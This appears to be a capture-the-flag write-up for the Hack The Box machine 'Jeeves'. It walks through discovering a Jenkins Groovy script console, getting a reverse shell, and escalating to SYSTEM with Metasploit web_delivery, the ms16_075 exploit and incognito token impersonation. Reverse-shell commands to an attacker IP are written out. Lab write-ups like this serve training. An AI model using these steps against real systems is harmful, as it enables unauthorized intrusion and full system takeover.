---
description: https://app.hackthebox.com/machines/114
---

# 🪄 Jeeves

<figure><img src="../../.gitbook/assets/image (577).png" alt=""><figcaption></figcaption></figure>

Staring with the nmap we see a web server on port 80 and 50000,&#x20;

**port 80:**

<figure><img src="../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>

just a webpage like this, the links do not go anywhere and if we search anything:

<figure><img src="../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>

we get an error page, with SQL server written on it so maybe we got a SQLi somewhere

but we quickly see the error page is a fake one, it's an image:

<figure><img src="../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>

So let's go on **port 50000**

open up the graphical interface and fire up the manual exploitation like this:

```
dirbuster&
```

<figure><img src="../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

after waiting for a bit we find a subdomain that redirects to a dashboard ->

<figure><img src="../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>

jeeves is well known to be unsecure and to have a script code section

<figure><img src="../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>

We instantly see that the script console uses groovy:

<figure><img src="../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>

now we go and fetch our payload of choice:

Groovy Reverse Shell - [https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)

<figure><img src="../../.gitbook/assets/image (585).png" alt=""><figcaption><p>copy this payload</p></figcaption></figure>

Set up a listener, modify the payload:

<figure><img src="../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>

then, fire up the payload and get your shell:

<figure><img src="../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>

Now is the perfect moment to look at our previous documentation:

{% content-ref url="../../documentation/cybersecurity-documentation/privilege-escalation/windows/impersonation-and-potato-attacks.md" %}
[impersonation-and-potato-attacks.md](../../documentation/cybersecurity-documentation/privilege-escalation/windows/impersonation-and-potato-attacks.md)
{% endcontent-ref %}

```
whoami /priv
```

we instantly see our go to path:

<figure><img src="../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>

another way of enumerating is ->

```
systeminfo
```

<figure><img src="../../.gitbook/assets/image (591).png" alt=""><figcaption></figcaption></figure>

copy and paste the whole outpu in a txt file, then

<figure><img src="../../.gitbook/assets/image (592).png" alt=""><figcaption></figcaption></figure>

```
./windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo systeminfo.txt
```

[**`https://github.com/AonCyberLabs/Windows-Exploit-Suggester`**](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

1. **`./v.py`**: This is the command to execute the Python script `windows-exploit-suggester.py`. The `./` prefix specifies the current directory where the script is located.
2. **`--database 2020-04-17-mssb.xls`**: This option specifies the database file to be used by the script. The database file, named `2020-04-17-mssb.xls`, likely contains information about known Microsoft security bulletins and associated vulnerabilities.
3. **`--systeminfo systeminfo.txt`**: This option specifies the system information file to be used by the script. The file named `systeminfo.txt` likely contains detailed information about the target Windows system, such as operating system version, installed patches, and installed software.

If ran correctly, we'll get hot potato attacks, juicy potato etc

We could also use metasploit:&#x20;

```
use exploit/multi/script/web_delivery
options
show targets
```

<figure><img src="../../.gitbook/assets/image (593).png" alt=""><figcaption></figcaption></figure>

```
set target 2
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.94
set srvhost 10.10.14.94
run
```

<figure><img src="../../.gitbook/assets/image (594).png" alt=""><figcaption></figcaption></figure>

then paste this payload in your already existing session:

<figure><img src="../../.gitbook/assets/image (595).png" alt=""><figcaption></figcaption></figure>

and back on your msfconsole you just have to type in the command:

```
sessions 1
```

<figure><img src="../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>

then to continue, you could enumerate:

```
 run post/multi/recon/local_exploit_suggester 
```

<figure><img src="../../.gitbook/assets/image (598).png" alt=""><figcaption></figcaption></figure>

put that aside with the background command and put this payload:

```
background
use exploit/windows/local/ms16_075_reflection
set lhost 10.10.14.94
set lport 5555 
#because session1 runs on 4444
set payload windows/x64/meterpreter/reverse_tcp
```

and if you did everything correctly and you run the payload, you'll get a shell, now

now let's follow in cmd:

```
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

<figure><img src="../../.gitbook/assets/image (599).png" alt=""><figcaption></figcaption></figure>

```
shell
```

And when  we go on administrator desktop we find no root flag?

Alternate Data Streams - [https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)

what we learn in this article is that there are primary data streams and alternate&#x20;

1. **Primary Data Streams**:
   * Primary data streams are the main data associated with a file. When you create or modify a file in Windows, you're working with its primary data stream.
   * Every file in NTFS has at least one primary data stream, which contains the file's main content.
   * Primary data streams are typically what you interact with when you open, read, write, or execute a file. They contain the file's actual data, such as text, executable code, images, etc.
   * Files with only primary data streams are considered "regular" files in Windows.
2. **Alternate Data Streams (ADS)**:
   * Alternate data streams are additional streams of data that can be associated with a file. They are not typically visible through regular file system navigation tools like File Explorer.
   * An alternate data stream is a named stream of data that is attached to a file's primary data stream. Each alternate data stream is associated with a specific name, allowing multiple streams to exist within a single file.
   * Alternate data streams can be used for various purposes, such as storing metadata, file attributes, or additional content related to the main file.
   * While alternate data streams are not commonly used in everyday file operations, they can be leveraged by attackers for hiding malicious content or data within seemingly innocent files.

So on the Desktop we see a hm.txt file

```
dir /R
```

<figure><img src="https://thecyberjedi.com/wp-content/uploads/2020/01/image-103.png" alt=""><figcaption></figcaption></figure>

to view the contents of the file we can type **more < hm.txt:root.txt**

**Very  good writeup:** [**https://thecyberjedi.com/jeeves/**](https://thecyberjedi.com/jeeves/)
